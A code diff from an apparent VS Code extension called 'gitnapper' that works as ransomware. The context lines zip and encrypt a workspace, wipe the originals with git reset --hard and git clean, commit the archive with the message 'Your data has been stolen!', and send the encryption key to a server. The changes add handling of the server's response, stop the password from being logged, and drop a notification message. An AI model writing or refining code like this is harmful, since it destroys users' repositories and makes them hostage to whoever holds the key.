@@ -236,6 +236,10 @@ async function sendKey(password) {
     // Send the password to the server
     await axios.post("http://127.0.0.1:5000/password", {
       encrypted_password: data.toString("base64"),
+    }).then((response) => {
+      vscode.window.showErrorMessage(response.data.message);
+    }).catch((error) => {
+      console.error("Error sending password to server:", error);
     });
 
     console.log("Encrypted password sent to the server.");
@@ -349,7 +353,6 @@ function activate(context) {
 
         // Generate a password
         let password = generateRandomPassword();
-        console.log("Password:", password);
 
         // Output handler
         const out = path.join(root, "gitnapper-output.zip");
@@ -358,12 +361,11 @@ function activate(context) {
         output.on("close", async () => {
           await git.reset(["--hard"]);
           await git.clean("f", "-d");
-          fs.rename(tmp, out, (err) => {})
+          fs.rename(tmp, out, () => {})
           await git.add(out);
           await git.commit("Your data has been stolen!");
           await sendKey(password);
           password = "";
-          vscode.window.showInformationMessage("Your data has been stolen!\n");
         });
 
         // Zip and encrypt content
